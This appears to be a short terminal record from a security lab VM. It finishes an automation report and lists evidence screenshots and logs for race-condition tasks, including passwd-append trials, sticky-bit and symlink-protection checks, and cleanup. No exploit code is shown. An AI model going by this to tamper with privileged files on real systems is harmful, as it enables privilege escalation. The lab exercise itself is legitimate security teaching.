+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
+seed@VM [B:lab-files]$ python3 ../automation/finish-report.py
+/home/seed/issd-member5/evidence/AUTOMATION_REPORT-20261003-054443.md
+Completed logs, control output, exact append, and final unprivileged binaries checked.
+seed@VM [B:lab-files]$ id; ls -1 ../evidence; ls -1 ../evidence/automation-20261003-054443/final-artifacts
+uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
+automation-20261003-054443
+AUTOMATION_REPORT-20261003-054443.md
+prior-user-captures
+S06-task2a-timing-20261003-051013.png
+S07-task2a-result-20261003-051108.png
+S08b-task2b-live-frame-20261003-062516-201148.png
+S08b-task2b-live-frame-20261003-062517-009823.png
+S08c-task2b-supplemental-failure-20261003-062714-857222.png
+S08-task2b-trial-20261003-055948-113446.png
+S09b-task2b-result-titled-20261003-060401-731809.png
+S09c-task2b-verified-return-to-seed-20261003-060509-204138.png
+S09-task2b-result-20261003-060257-002725.png
+S10b-task2b-sticky-bit-20261003-054837-421699.png
+S10c-task2b-retry1-file-exists-20261003-060044-140462.png
+S10-task2b-sticky-bit-20261003-054501-795268.png
+S11a-task2c-atomic-trial-20261003-060518-538593.png
+S11b-task2c-atomic-result-20261003-060651-471964.png
+S12a-task3a-running-20261003-060803-155772.png
+S12b-task3a-300-second-result-20261003-061538-113813.png
+S12c-task3a-code-and-controls-20261003-061543-393850.png
+S12d-task3a-readable-control-result-20261003-061634-221128.png
+S13a-task3b-running-20261003-061644-641166.png
+S13b-task3b-300-second-result-20261003-062412-658217.png
+S13c-task3b-symlink-protection-20261003-062417-917614.png
+S14-cleanup-20261003-062719-115749.png
+automation
+logs
+passwd-before.sha256
+README.md
+source
+sysctl-before.txt
+seed@VM [B:lab-files]$ history -a
+seed@VM [B:lab-files]$ 
